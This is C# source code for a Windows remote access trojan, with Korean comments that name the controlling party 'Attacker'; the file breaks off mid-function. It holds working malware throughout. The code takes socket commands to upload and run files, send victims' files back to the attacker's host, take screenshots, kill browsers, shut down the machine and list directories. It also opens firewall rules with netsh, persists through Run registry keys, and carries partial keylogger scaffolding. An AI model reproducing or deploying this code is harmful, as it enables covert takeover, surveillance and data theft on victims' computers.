using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using NetFwTypeLib;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace 멀티소켓_서버
{
    class ListenPorts
    {
        private static readonly string FirewallCmd = "netsh firewall add allowedprogram \"{1}\" \"{0}\" ENABLE";
        private static readonly string AdvanceFirewallCmd = "netsh advfirewall firewall add rule name=\"{0}\" dir=in action=allow program=\"{1}\" enable=yes";
        private static readonly int VistaMajorVersion = 6;

        private List<Socket> _Clients;
        private Thread _Thread;

        public IPEndPoint ipep1; //Attacker에게 데이터를 전송할 종단점
        public IPEndPoint ipep2; //FTP다운로드 서버
        public IPEndPoint ipep3; //Web서버
        public IPEndPoint ipep4; //FTP업로드 서버

        string Yip; //Attacker의 FTPServer IP
        public static int T = 0; //에러를 확인하기 위한 인수
        Socket[] socket;
        IPEndPoint[] ipEndPoint;
        public static string FTPFileN;
        public static string FolderSC = "";
        public static string DIRSC = "";
        public static string KLPath = @"C:\factory\key\";
        public static int key = 0;
        public static int key2 = 0;

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        internal ListenPorts(IPEndPoint[] ipEndPoint)
        {
            this.ipEndPoint = ipEndPoint;
            socket = new Socket[ipEndPoint.Length];
        }


        public void beginListen()
        {

            //for (int i = 0; i < ipEndPoint.Length; i++)
            //{
            socket[0] = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            socket[0].Bind(ipEndPoint[0]);

            Thread t_handler = new Thread(threadListen);
            t_handler.IsBackground = true;
            t_handler.Start(socket[0]);
            //}
        }

        public void WSV()
        {
            if (!File.Exists(Application.StartupPath + @"\web\main.html"))
            {
                if (!Directory.Exists(Application.StartupPath + @"\web\"))
                {
                    Directory.CreateDirectory(Application.StartupPath + @"\web\");
                }


                string Htemp =
                    "<html>"
                    + Environment.NewLine
                    + "<head>" + Environment.NewLine
                    + "<meta charset = " + '\u0022' + "utf-8" + '\u0022' + ">" + Environment.NewLine
                    + "</head>" + Environment.NewLine
                    + "<body>" + Environment.NewLine
                    + "<img src = " + '\u0022' + "1.png" + '\u0022' + "width = " + '\u0022' + "100%" + '\u0022' + "height = " + '\u0022' + "100%" + '\u0022' + ">" + Environment.NewLine
                    + "</body>" + Environment.NewLine
                    + "</html>";

                File.AppendAllText(Application.StartupPath + @"\web\main.html", Htemp);
            }

            socket[2] = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            socket[2].Bind(ipEndPoint[2]);
            socket[2].Listen(20);

            Thread t_handler3 = new Thread(WSV_S);
            t_handler3.IsBackground = true;
            t_handler3.Start(socket[2]);
        }

        public void WSV_S(object sender)
        {
            
            while (true)
            {
                Socket m_client = sender as Socket;
                m_client.Listen(20);
                Socket client = m_client.Accept();
                //Socket client = socket[2].Accept();
                
                try
                {
                    Console.Write("성공");
                    String file = Recieve(client);
                    Console.WriteLine("========================================");
                    Console.WriteLine(file.ToString());
                    Console.WriteLine("========================================");
                    FileInfo FI = new FileInfo(file);
                    client.Send(Header(client, FI));
                }
                catch { }
                finally
                {
                    client.Close();
                }
            }
        }

        public String Recieve(Socket client)
        {
            String data_str = "";
            byte[] data = new byte[4096];
            client.Receive(data);
            Console.WriteLine(Encoding.Default.GetString(data).Trim('\0'));
            String[] buf = Encoding.Default.GetString(data).Split("\r\n".ToCharArray());

            if (buf[0].IndexOf("GET") != -1)
            {
                data_str = buf[0].Replace("GET", "").Replace("HTTP/1.1", "").Trim();
            }

            else
            {
                data_str = buf[0].Replace("POST ", "").Replace("HTTP/1.1", "").Trim();
            }

            if (data_str.Trim() == "/")
            {
                data_str += "main.html";
            }

            int pos = data_str.IndexOf("?");
            if (pos > 0)
            {
                data_str = data_str.Remove(pos);
            }
            Console.WriteLine("========================================");
            Console.WriteLine(data_str.ToString() + "+datastr");
            Console.WriteLine("========================================");
            return "web" + data_str; //main.html 파일의 폴더경로다
        }

        public byte[] Header(Socket client, FileInfo FI)
        {
            Console.WriteLine("========================================");
            Console.WriteLine(FI.ToString() + "FI");
            Console.WriteLine("========================================");

            byte[] data2 = new byte[FI.Length];
            try
            {
                FileStream FS = new FileStream(FI.FullName, FileMode.Open, FileAccess.Read);

                FS.Read(data2, 0, data2.Length);
                FS.Close();

                String buf = "HTTP/1.0 200 ok\r\n";
                buf += "Data: " + FI.CreationTime.ToString() + "\r\n";
                buf += "server: Myung server\r\n";
                buf += "Content-Length: " + data2.Length.ToString() + "\r\n";
                buf += "content-type:text/html\r\n";
                buf += "\r\n";
                Console.WriteLine("========================================");
                Console.WriteLine(buf.ToString() + "HEADER");
                Console.WriteLine("========================================");
                client.Send(Encoding.Default.GetBytes(buf));
            }
            catch
            {
                String buf = "HTTP/1.0 100 BedRequest ok\r\n";
                buf += "server: Myung server\r\n";
                buf += "content-type:text/html\r\n";
                buf += "\r\n";
                client.Send(Encoding.Default.GetBytes(buf));
                data2 = Encoding.Default.GetBytes("Bed Request");

            }


            return data2;
        }

        public void FTPListen()
        {
            socket[1] = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            socket[1].Bind(ipEndPoint[1]);

            Thread t_handler2 = new Thread(FTPServer);
            t_handler2.IsBackground = true;
            t_handler2.Start(socket[1]);
            Console.WriteLine("FTP서버 열기성공");
        }

        public void FTPServer(object sender)
        {
            Socket m_client = sender as Socket;
            m_client.Listen(100);
            Socket newSocket = m_client.Accept();
            Console.WriteLine("연결대기 성공");
            
            byte[] buffer = new byte[4];
            newSocket.Receive(buffer);
            int fileLength = BitConverter.ToInt32(buffer, 0);
            buffer = new byte[1024];
            int totalLength = 0;
            Console.WriteLine("성공");
            Console.WriteLine(FTPFileN);

            FileStream fileStr = new FileStream(FTPFileN, FileMode.Create, FileAccess.Write);
            BinaryWriter writer = new BinaryWriter(fileStr);
            Console.WriteLine("마지막단계 성공");
            while (totalLength < fileLength)
            {

                int receiveLength = newSocket.Receive(buffer);
                writer.Write(buffer, 0, receiveLength);
                totalLength += receiveLength;

            }
            Console.WriteLine("전송받음");
            writer.Close();
            newSocket.Close();
            m_client.Close();
            try
            {
                File.Move(FTPFileN, "C:\\factory\\" + FTPFileN);
            }
            catch
            {
                if(File.Exists("C:\\factory\\" + FTPFileN))
                {
                    File.Delete(FTPFileN);
                }
            }
            return;
        }

        public static bool AuthorizeProgram(string name, string programFullPath)
        {
            try
            { // OS version check 
                string strFormat = FirewallCmd;
                if (System.Environment.OSVersion.Version.Major >= VistaMajorVersion)
                {
                    strFormat = AdvanceFirewallCmd;
                }
                // Start to register 
                string command = String.Format(strFormat, name, programFullPath);
                System.Console.WriteLine(command);

                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.CreateNoWindow = true;
                startInfo.FileName = "cmd.exe";
                startInfo.UseShellExecute = false;
                startInfo.RedirectStandardInput = true;
                startInfo.RedirectStandardOutput = true;
                startInfo.RedirectStandardError = true;

                Process process = new Process();
                process.EnableRaisingEvents = false;
                process.StartInfo = startInfo;
                process.Start();
                process.StandardInput.Write(command + Environment.NewLine);
                process.StandardInput.Close();

                string result = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit(); process.Close();
            }
            catch
            {
                return false;
            }

            return true;
        }
        

        void CAP()
        {
            test1 ms = new test1();
            ms.a = new List<Int32>();

            int FN = 1;
            int max = 0;
            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);

            var gfxScreenShot = Graphics.FromImage(bmpScreenshot);
            gfxScreenShot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);

            if (!Directory.Exists("C:\\factory"))
            {
                Directory.CreateDirectory("C:\\factory");
                bmpScreenshot.Save("C:\\factory\\" + FN + ".png", ImageFormat.Png);
                bmpScreenshot.Dispose();
            }
            else
            {
                try
                {
                    if (File.Exists("C:\\factory\\1.png"))
                    {
                        DirectoryInfo dir = new DirectoryInfo("C:\\factory");
                        foreach (string name in Directory.GetFiles(Convert.ToString(dir)))
                        {
                            string[] temp = name.Split('\\');
                            Console.WriteLine(temp[2]); // x.png

                            string[] temp2 = temp[2].Split('.');
                            Console.WriteLine(temp2[0]);
                            ms.a.Add(Convert.ToInt32(temp2[0]));

                        }

                        foreach (Int32 b in ms.a)
                        {
                            if (max < b)
                            {
                                max = b;
                            }
                        }
                        Console.WriteLine("최대값 : " + max);
                        bmpScreenshot.Save("C:\\factory\\" + (max + 1) + ".png", ImageFormat.Png);
                        bmpScreenshot.Dispose();
                    }
                    else
                    {
                        bmpScreenshot.Save("C:\\factory\\" + FN + ".png", ImageFormat.Png);
                        bmpScreenshot.Dispose();
                    }
                }
                catch
                {
                    bmpScreenshot.Save("C:\\factory\\" + FN + ".png", ImageFormat.Png);
                    bmpScreenshot.Dispose();
                }
            }
        }
        public static string cl_tp1;
        public static string cl_tp2;
        public static string cl_tp3;
        Thread KLO;
        private void threadListen(object sender) //서버 시작부분
        {
            System.Timers.Timer timer2 = new System.Timers.Timer(); //키로그캡쳐
            timer2.Interval = 1000;
            timer2.Elapsed += new ElapsedEventHandler(timer2_Elapsed);

            while (true)
            {
                Socket m_client = sender as Socket;
                m_client.Listen(100);
                Socket newSocket = m_client.Accept();

                while (true)
                {
                    try
                    {
                        //문자열 수신부
                        byte[] data = new byte[1024];
                        int bytes = newSocket.Receive(data);
                        string result = Encoding.Unicode.GetString(data, 0, bytes);

                        IPEndPoint remoteIP = newSocket.RemoteEndPoint as IPEndPoint;
                        IPEndPoint localIP = newSocket.LocalEndPoint as IPEndPoint;

                        Console.WriteLine("SERVER ip : " + localIP.ToString() + " REMOTE ip : " + remoteIP.ToString());

                        Console.WriteLine("Attacker : " + result);
                        cl_tp3 = remoteIP.ToString();

                        string[] temp = result.Split(':');

                        if (temp[0] == "FTP$")
                        {
                            try
                            {
                                if (!Directory.Exists("C:\\factory"))
                                {
                                    Directory.CreateDirectory("C:\\factory");
                                    Console.WriteLine("신규폴더 생성 완료");

                                    FTPFileN = temp[1]; //받은파일
                                    Console.WriteLine("파일 읽기 성공");
                                    string msg = "전송중..."; //Received 되는 문자열
                                    byte[] Error = Encoding.Unicode.GetBytes(msg);
                                    newSocket.Send(Error, Error.Length, SocketFlags.None);
                                    Console.WriteLine("Send data : {0}", msg);
                                    Console.WriteLine();

                                    FTPListen();
                                }
                                else
                                {
                                    FTPFileN = temp[1]; //받은파일
                                    Console.WriteLine("파일 읽기 성공");
                                    string msg = "전송중..."; //Received 되는 문자열
                                    byte[] Error = Encoding.Unicode.GetBytes(msg);
                                    newSocket.Send(Error, Error.Length, SocketFlags.None);
                                    Console.WriteLine("Send data : {0}", msg);
                                    Console.WriteLine();

                                    FTPListen();
                                }

                            }
                            catch
                            {
                                string msg = "파일이 이미 있거나 잘못 입력되었습니다."; //Received 되는 문자열
                                byte[] Error = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(Error, Error.Length, SocketFlags.None);
                                Console.WriteLine("Send data : {0}", msg);
                                Console.WriteLine();
                            }

                        }
                        
                        else if (temp[0] == "DOWN$")
                        {
                            try
                            {
                                string[] Dirtemp = temp[1].Split('*'); //경로의 '*'문자를 ':' 로 변경
                                string Dtemp = ""; //수정된 경로를 저장할 곳이다.

                                for (int i = 0; i < Dirtemp.Length; i++)
                                {
                                    Dtemp += Dirtemp[i] + ":";
                                }
                                Dtemp = Dtemp.Substring(0, Dtemp.LastIndexOf(':')); //마지막 문자열 ":" 을 삭제함


                                if (!File.Exists(Dtemp))
                                {
                                    string msg = "찾는 파일이 없습니다."; //Received 되는 문자열
                                    byte[] Error = Encoding.Unicode.GetBytes(msg);
                                    newSocket.Send(Error, Error.Length, SocketFlags.None);
                                    Console.WriteLine("Send data : {0}", msg);
                                    Console.WriteLine();
                                }
                                else
                                {
                                    cl_tp1 = Dtemp; //파일경로 저장
                                                    /////MessageBox.Show(cl_tp1.ToString());
                                    string msg = "CL_FTP$";
                                    byte[] Error = Encoding.Unicode.GetBytes(msg);
                                    newSocket.Send(Error, Error.Length, SocketFlags.None);
                                    Console.WriteLine("Send data : {0}", msg);
                                }
                            }
                            catch
                            {
                                string msg = "Error : Code:DOWN"; //Received 되는 문자열
                                byte[] Error = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(Error, Error.Length, SocketFlags.None);
                                Console.WriteLine("Send data : {0}", msg);
                                Console.WriteLine();
                            }
                        }
                        else if (temp[0] == "CL_UP$") //파일 다운로드의 추가적인 기능
                        {
                            try
                            {
                                string[] cl_tpip = cl_tp3.Split(':');
                                ipep4 = new IPEndPoint(IPAddress.Parse(cl_tpip[0]), 8181);

                                Socket server2 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                                server2.Connect(ipep4);


                                FileStream fileStr = new FileStream(cl_tp1, FileMode.Open, FileAccess.Read);
                                int fileLength = (int)fileStr.Length;
                                byte[] buffer = BitConverter.GetBytes(fileLength);
                                server2.Send(buffer);
                                int count = fileLength / 1024 + 1;

                                BinaryReader reader = new BinaryReader(fileStr);

                                for (int i = 0; i < count; i++)
                                {
                                    buffer = reader.ReadBytes(1024);
                                    server2.Send(buffer);
                                }
                                reader.Close();
                                server2.Close();
                            }
                            catch
                            {
                                Console.WriteLine("전송완료");
                            }
                        }

                        else if (temp[0] == "EXT_B$")
                        {
                            try
                            {
                                Process[] proc = Process.GetProcessesByName("chrome");
                                if (proc.Length > 0)
                                {
                                    foreach (Process pr in proc)
                                    {
                                        pr.Kill();
                                    }
                                }

                                Process[] proc2 = Process.GetProcessesByName("msedge");
                                if (proc2.Length > 0)
                                {
                                    foreach (Process pr2 in proc2)
                                    {
                                        pr2.Kill();
                                    }
                                }

                                string msg = "모든 브라우저 프로세스가 종료되었습니다.";
                                byte[] Error = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(Error, Error.Length, SocketFlags.None);
                                Console.WriteLine("Send data : [0]", msg);
                                Console.WriteLine();
                            }
                            catch
                            {
                                string msg = "오류 명령이 제대로 실행되지 않았습니다.";
                                byte[] Error = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(Error, Error.Length, SocketFlags.None);
                                Console.WriteLine("Send data : [0]", msg);
                                Console.WriteLine();
                            }
                        }
                        
                        else if (temp[0] == "MSG$") //메세지 보내기
                        {
                            try
                            {
                                MessageBox.Show(new Form { TopMost = true }, temp[1].ToString());
                                Console.WriteLine(temp[1]);

                                string msg = "메세지 전송 성공";
                                byte[] Error = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(Error, Error.Length, SocketFlags.None);
                                Console.WriteLine("Send data : [0]", msg);
                                Console.WriteLine();
                            }
                            catch
                            {
                                string msg = "오류 명령이 제대로 실행되지 않았습니다.";
                                byte[] Error = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(Error, Error.Length, SocketFlags.None);
                                Console.WriteLine("Send data : [0]", msg);
                                Console.WriteLine();
                            }
                        }
                        else if (temp[0] == "DIRC$")
                        {
                            try
                            {
                                Directory.CreateDirectory(@"C:\factory\");
                                string msg = "생성완료!!"; //Received 되는 문자열
                                byte[] Error = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(Error, Error.Length, SocketFlags.None);
                                Console.WriteLine("Send data : {0}", msg);
                                Console.WriteLine();
                            }
                            catch
                            {
                                string msg = "폴더가 이미 있습니다."; //Received 되는 문자열
                                byte[] Error = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(Error, Error.Length, SocketFlags.None);
                                Console.WriteLine("Send data : {0}", msg);
                                Console.WriteLine();
                            }
                        }

                        else if (temp[0] == "CAP$")
                        {
                            try
                            {
                                CAP();
                            }
                            catch 
                            {
                                string msg = "오류 명령이 제대로 실행되지 않았습니다.";
                                byte[] Error = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(Error, Error.Length, SocketFlags.None);
                                Console.WriteLine("Send data : [0]", msg);
                                Console.WriteLine();
                            }
                        }
                        else if (temp[0] == "CONNECT$")
                        {
                            try
                            {
                                string msg = "접속 되었습니다!"; //Received 되는 문자열
                                byte[] Error = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(Error, Error.Length, SocketFlags.None);
                                Console.WriteLine("Send data : {0}", msg);
                                Console.WriteLine();
                            }
                            catch
                            {
                                string msg = "오류 명령이 제대로 실행되지 않았습니다.";
                                byte[] Error = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(Error, Error.Length, SocketFlags.None);
                                Console.WriteLine("Send data : [0]", msg);
                                Console.WriteLine();
                            }
                        }
                        else if (temp[0] == "STF$")
                        {
                            try
                            {
                                string[] Dirtemp = temp[1].Split('*'); //경로의 '*'문자를 ':' 로 변경
                                string DR = ""; //수정된 경로를 저장할 곳이다.

                                for (int i = 0; i < Dirtemp.Length; i++)
                                {
                                    DR += Dirtemp[i] + ":";
                                }
                                DR = DR.Substring(0, DR.LastIndexOf(':')); //마지막 문자열 ":" 을 삭제함

                                string prog = Path.Combine(DR);
                                Process.Start(prog);

                                string msg = "실행완료 되었습니다!!"; //Received 되는 문자열
                                byte[] Error = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(Error, Error.Length, SocketFlags.None);
                                Console.WriteLine("Send data : {0}", msg);
                                Console.WriteLine();
                            }
                            catch
                            {
                                string msg = "Erorr : 지정된 파일을 찾을 수 없거나 실행할 수 없습니다.";
                                byte[] Error = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(Error, Error.Length, SocketFlags.None);
                                Console.WriteLine("Send data : {0}", msg);
                                Console.WriteLine();
                            }


                            }
                        else if (temp[0] == "KLO$")
                        {
                            //key2 = 1;

                            //timer2.Start(); 캡쳐 기능이나 이제사용하지않음
                            //KLO = new Thread(new ThreadStart(KLY)); //키로그
                            //KLO.Start(); //키로그

                            string msg = "키보드 후킹이 시작되었습니다. 로그와사진의 경로는 C:\\factory\\key\\ 안에저장됩니다."; //Received 되는 문자열
                            byte[] Error = Encoding.Unicode.GetBytes(msg);
                            newSocket.Send(Error, Error.Length, SocketFlags.None);
                            Console.WriteLine("Send data : {0}", msg);
                            Console.WriteLine();
                        }
                        else if (temp[0] == "KLN$")
                        {
                            try
                            {
                                //key2 = 0;

                                //timer2.Stop(); 캡쳐 기능이나 이제사용하지않음
                                KLO.Abort();

                                string msg = "키보드 후킹이 중지되었습니다."; //Received 되는 문자열
                                byte[] Error = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(Error, Error.Length, SocketFlags.None);
                                Console.WriteLine("Send data : {0}", msg);
                                Console.WriteLine();
                            }
                            catch
                            {
                                string msg = "Error : 키보드 후킹 기능이 켜져있지않습니다."; //Received 되는 문자열
                                byte[] Error = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(Error, Error.Length, SocketFlags.None);
                                Console.WriteLine("Send data : {0}", msg);
                                Console.WriteLine();
                            }
                        }
                        else if (temp[0] == "WEB$")
                        {
                            try
                            {
                                Thread WebServer = new Thread(new ThreadStart(WSV));
                                WebServer.Start();

                                //Process.Start(WSV);//ASP.NET서버

                                string msg = "화면이 공유되었습니다. 'http://타겟IP:8087' 에서 확인 가능합니다."; //Received 되는 문자열
                                byte[] Error = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(Error, Error.Length, SocketFlags.None);
                                Console.WriteLine("Send data : {0}", msg);
                                Console.WriteLine();
                            }
                            catch
                            {
                                string msg = "오류 명령이 제대로 실행되지 않았습니다.";
                                byte[] Error = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(Error, Error.Length, SocketFlags.None);
                                Console.WriteLine("Send data : [0]", msg);
                                Console.WriteLine();
                            }

                        }

                        else if (temp[0] == "RMT$")
                        {
                            try
                            {
                                if (File.Exists(@"C:\factory\SMT1.0.exe"))
                                {

                                    AuthorizeProgram("SMT1.0.exe", @"C:\factory\SMT1.0.exe");

                                    Process.Start(@"C:\factory\SMT1.0.exe");

                                    string msg = "화면이 공유되었습니다. 'http://타겟IP:8050' 에서 확인 가능합니다."; //Received 되는 문자열
                                    byte[] Error = Encoding.Unicode.GetBytes(msg);
                                    newSocket.Send(Error, Error.Length, SocketFlags.None);
                                    Console.WriteLine("Send data : {0}", msg);
                                    Console.WriteLine();
                                }
                                else
                                {
                                    string msg = "STM 모듈이 없습니다. 업로드 기능을 통해 모듈을 먼저 factory에 올려주세요"; //Received 되는 문자열
                                    byte[] Error = Encoding.Unicode.GetBytes(msg);
                                    newSocket.Send(Error, Error.Length, SocketFlags.None);
                                    Console.WriteLine("Send data : {0}", msg);
                                    Console.WriteLine();
                                }
                            }
                            catch
                            {
                                string msg = "오류 명령이 제대로 실행되지 않았습니다.";
                                byte[] Error = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(Error, Error.Length, SocketFlags.None);
                                Console.WriteLine("Send data : [0]", msg);
                                Console.WriteLine();
                            }

                        }
                        else if (temp[0] == "RMN$")
                        {
                            try
                            {
                                Process[] procList = Process.GetProcessesByName("SMT1.0");
                                if (procList.Length > 0)
                                {
                                    procList[0].Kill();
                                    string msg = "화면공유가 중지되었습니다.";
                                    byte[] Error = Encoding.Unicode.GetBytes(msg);
                                    newSocket.Send(Error, Error.Length, SocketFlags.None);
                                    Console.WriteLine("Send data : {0}", msg);
                                    Console.WriteLine();

                                }
                                else
                                {
                                    string msg = "Error : 화면공유중이 아닙니다.";
                                    byte[] Error = Encoding.Unicode.GetBytes(msg);
                                    newSocket.Send(Error, Error.Length, SocketFlags.None);
                                    Console.WriteLine("Send data : {0}", msg);
                                    Console.WriteLine();
                                }
                            }
                            catch
                            {
                                string msg = "오류 명령이 제대로 실행되지 않았습니다.";
                                byte[] Error = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(Error, Error.Length, SocketFlags.None);
                                Console.WriteLine("Send data : [0]", msg);
                                Console.WriteLine();
                            }
                        }
                        else if (temp[0] == "STH$")
                        {
                            try
                            {
                                string time = temp[1].ToString();
                                Process.Start("shutdown.exe", "-s -t " + time);
                                newSocket.Close();
                                m_client.Close();
                                return;
                            }
                            catch
                            {
                                string msg = "오류 명령이 제대로 실행되지 않았습니다.";
                                byte[] Error = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(Error, Error.Length, SocketFlags.None);
                                Console.WriteLine("Send data : [0]", msg);
                                Console.WriteLine();
                            }
                        }
                        else if (temp[0] == "STT$")
                        {
                            try
                            {
                                //File.Copy(Path.Combine(Application.ExecutablePath),
                                    //@"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\" + Path.GetFileName(Assembly.GetEntryAssembly().Location));

                                Console.WriteLine("시작메뉴 파일등록 성공");

                                //MessageBox.Show(Application.StartupPath.ToString());
                                //레지스트리 등록
                                using (RegistryKey key = Registry.CurrentUser.OpenSubKey
                                    (@"Software\Microsoft\Windows\CurrentVersion\Run", true))
                                {
                                    key.SetValue("VoidSeeker", Path.Combine(Application.ExecutablePath));
                                }

                                //관리자권한 시작프로그램 등록
                                string runKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
                                RegistryKey rk = Registry.LocalMachine.OpenSubKey(runKey);
                                if (rk.GetValue("Test") == null)
                                {
                                    rk.Close();
                                    rk = Registry.LocalMachine.OpenSubKey(runKey, true);
                                    rk.SetValue("Test", Application.ExecutablePath);
                                }

                                string msg = "시작프로그램이 등록되었습니다."; //Received 되는 문자열
                                byte[] Error = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(Error, Error.Length, SocketFlags.None);
                                Console.WriteLine("Send data : {0}", msg);
                                Console.WriteLine();
                            }
                            catch (Exception ea)
                            {
                                string msg = "Error : 등록실패" + ea.ToString(); //Received 되는 문자열
                                byte[] Error = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(Error, Error.Length, SocketFlags.None);
                                Console.WriteLine("Send data : {0}", msg);
                                Console.WriteLine();
                            }
                        }

                        else if (temp[0] == "STD$")
                        {
                            try
                            {
                                //시작메뉴에 카피된 파일 삭제
                                if (File.Exists(@"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\" + Path.GetFileName(Assembly.GetEntryAssembly().Location))) //앞 Path는 파일자기자신의 이름을 가져오기 위해 사용
                                {
                                    File.Delete(@"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\" + Path.GetFileName(Assembly.GetEntryAssembly().Location));
                                }

                                //레지스트리 등록 해제
                                using (RegistryKey key = Registry.CurrentUser.OpenSubKey
                                    (@"Software\Microsoft\Windows\CurrentVersion\Run", true))
                                {
                                    key.DeleteValue("VoidSeeker", false);
                                }

                                //관리자권한 시작프로그램 등록해제
                                string runKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
                                RegistryKey rk = Registry.LocalMachine.OpenSubKey(runKey, true);
                                rk.DeleteValue("Test");

                                string msg = "시작프로그램 등록이 해제되었습니다."; //Received 되는 문자열
                                byte[] Error = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(Error, Error.Length, SocketFlags.None);
                                Console.WriteLine("Send data : {0}", msg);
                                Console.WriteLine();
                            }
                            catch (Exception ea)
                            {
                                string msg = "Error : 등록해제 실패" + ea.ToString(); //Received 되는 문자열
                                byte[] Error = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(Error, Error.Length, SocketFlags.None);
                                Console.WriteLine("Send data : {0}", msg);
                                Console.WriteLine();
                            }
                        }

                        else if (temp[0] == "WIN$")
                        {
                            try
                            {
                                int y = Convert.ToInt32(temp[1]);

                                for (int x = 0; x < y; x++)
                                {
                                    Process.Start("https://" + temp[2]);
                                }

                                string msg = "성공"; //Received 되는 문자열
                                byte[] Error = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(Error, Error.Length, SocketFlags.None);
                                Console.WriteLine("Send data : {0}", msg);
                                Console.WriteLine();
                            }
                            catch
                            {
                                string msg = "성공"; //Received 되는 문자열
                                byte[] Error = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(Error, Error.Length, SocketFlags.None);
                                Console.WriteLine("Send data : {0}", msg);
                                Console.WriteLine();

                                Console.WriteLine("인수가 입력되지 않았습니다. 다시입력해 주세요");
                            }
                        }
                        else if (temp[0] == "KILL$")
                        {
                            try
                            {
                                string msg = "종료성공"; //Received 되는 문자열
                                byte[] Error = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(Error, Error.Length, SocketFlags.None);
                                Console.WriteLine("Send data : {0}", msg);
                                Console.WriteLine();

                                Process[] processList = Process.GetProcessesByName("멀티소켓 서버.exe");

                                if (processList.Length > 0)
                                {
                                    processList[0].Kill();
                                }
                                Environment.Exit(0);
                            }
                            catch
                            {
                                string msg = "오류 명령이 제대로 실행되지 않았습니다.";
                                byte[] Error = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(Error, Error.Length, SocketFlags.None);
                                Console.WriteLine("Send data : [0]", msg);
                                Console.WriteLine();
                            }
                        }
                        else if (temp[0] == "DIR$")
                        {
                            try
                            {
                                Console.WriteLine(temp[1]);
                                string STest = temp[1].ToString();
                                char[] Test = STest.ToCharArray(); //받은 값은 Char배열로 나열함

                                foreach (char ST in Test)
                                {
                                    if (ST == '*')
                                    {
                                        T = 1;
                                    }
                                }

                                if (T == 0) //에러인자가 "거짓" 일 경우 에러를 BroadCast 한 후에 return
                                {
                                    string msg = "명령을 실행할 수 없습니다."; //Received 되는 문자열
                                    byte[] Error = Encoding.Unicode.GetBytes(msg);
                                    newSocket.Send(Error, Error.Length, SocketFlags.None);
                                    Console.WriteLine("Send data : {0}", msg);
                                    Console.WriteLine();
                                }

                                else if (T == 1)
                                {
                                    string[] Dirtemp = temp[1].Split('*'); //경로의 '*'문자를 ':' 로 변경
                                    string DR = ""; //수정된 경로를 저장할 곳이다.

                                    for (int i = 0; i < Dirtemp.Length; i++)
                                    {
                                        DR += Dirtemp[i] + ":";
                                    }
                                    DR = DR.Substring(0, DR.LastIndexOf(':')); //마지막 문자열 ":" 을 삭제함

                                    Console.WriteLine("지정된 경로 : " + DR);
                                    byte[] buffer = Encoding.Unicode.GetBytes("Server : 지정된 경로 - " + DR + Environment.NewLine + "데이터를 탐색합니다.");
                                    newSocket.Send(buffer, buffer.Length, SocketFlags.None);

                                    DirScan(Path.Combine(DR)); //함수를 새로 실행하여 값을 수동(?)으로 반환받는다
                                    string DirInfo = DIRSC; //반환값 저장

                                    byte[] Dir = Encoding.Unicode.GetBytes(DirInfo.ToString());
                                    newSocket.Send(Dir, Dir.Length, SocketFlags.None);
                                    Console.WriteLine("Send data : 전송완료");
                                    Console.WriteLine();

                                    T = 0; //초기화
                                    DIRSC = "";
                                }
                            }

                            catch
                            {
                                string msg = "전송됨";
                                byte[] Error = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(Error, Error.Length, SocketFlags.None);
                                Console.WriteLine("Send data : [0]", msg);
                                Console.WriteLine();
                            }
                        }
                        else if (temp[0] == "DEF$")
                        {
                            try
                            {
                                string[] Dirtemp = temp[1].Split('*'); //경로의 '*'문자를 ':' 로 변경
                                string Dtemp = ""; //수정된 경로를 저장할 곳이다.

                                for (int i = 0; i < Dirtemp.Length; i++)
                                {
                                    Dtemp += Dirtemp[i] + ":";
                                }
                                Dtemp = Dtemp.Substring(0, Dtemp.LastIndexOf(':')); //마지막 문자열 ":" 을 삭제함

                                if (!File.Exists(Dtemp))
                                {
